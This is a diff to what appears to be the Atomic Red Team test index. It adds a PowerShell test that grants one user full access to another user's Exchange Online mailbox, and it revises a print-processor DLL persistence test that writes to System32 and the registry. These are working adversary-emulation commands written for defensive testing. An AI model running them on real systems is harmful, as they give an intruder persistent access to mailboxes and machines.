@@ -1375,6 +1375,53 @@ input_arguments.remote_url.type: url
 input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
 
 "
+T1098.002,Account Manipulation: Additional Email Delegate Permissions,EXO - Full access mailbox permission granted to a user,17d046be-fdd0-4cbb-b5c7-55c85d9d0714,"Give a nominated user, full mailbox delegation access of another user.
+This can be used by an adversary to maintain persistent access to a target's mailbox in M365.
+",office-365,,,"Import-Module ExchangeOnlineManagement
+$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
+Connect-ExchangeOnline -Credential $creds
+Add-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All
+Disconnect-ExchangeOnline -Confirm:$false
+",powershell,False,,"Import-Module ExchangeOnlineManagement
+$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
+Connect-ExchangeOnline -Credential $creds
+Remove-MailboxPermission -Identity ""#{delegate_target}"" -User ""#{operator_mailbox}"" -AccessRights FullAccess -InheritanceType All -Confirm:$false
+Disconnect-ExchangeOnline -Confirm:$false
+",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed
+
+dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
+if (-not $RequiredModule) {exit 1}
+if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
+
+dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement         
+
+","input_arguments.username.description: office-365 username
+
+input_arguments.username.type: string
+
+input_arguments.username.default: o365_user_test@contoso.com
+
+input_arguments.password.description: office-365 password
+
+input_arguments.password.type: string
+
+input_arguments.password.default: o365_password_test
+
+input_arguments.delegate_target.description: office-365 target_email
+
+input_arguments.delegate_target.type: string
+
+input_arguments.delegate_target.default: delegate@contoso.com
+
+input_arguments.operator_mailbox.description: office-365 target_email
+
+input_arguments.operator_mailbox.type: string
+
+input_arguments.operator_mailbox.default: operator@contoso.com
+
+"
 T1055,Process Injection,Shellcode execution via VBA,1c91e740-1729-4329-b779-feba6e71d048,"This module injects shellcode into a newly created process and executes. By default the shellcode is created,
 with Metasploit, for use on x86-64 Windows 10 machines.
 
@@ -17158,18 +17205,18 @@ The new print processor will point to a DLL which will be loaded by the spooler 
 Note: The test assumes a x64 Windows operating system.
 
 The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)
-",windows,,,"net stop spooler
-Copy-Item $PathToAtomicsFolder\T1547.012\bin\PrintProcessor.dll C:\Windows\System32\spool\prtprocs\x64\PrintProcessor.dll
-reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""PrintProcessor.dll"" /t REG_SZ /f
-reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /f >nul 2>&1
+",windows,,,"if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}
+net stop spooler
+Copy-Item $PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
+reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f
 net start spooler
 if(#{restart}){
   Restart-Computer
 }
 ",powershell,True,,"net stop spooler
-rm -force C:\Windows\System32\spool\prtprocs\x64\PrintProcessor.dll
-rm -force C:\Users\Public\AtomicRedTeam.txt
-reg delete ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /f >nul 2>&1
+rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
+rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
+remove-item ""HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" -Force -ErrorAction SilentlyContinue
 net start spooler
 ",,,"input_arguments.restart.description: set to 1 if you want the computer to reboot as part of the test
 
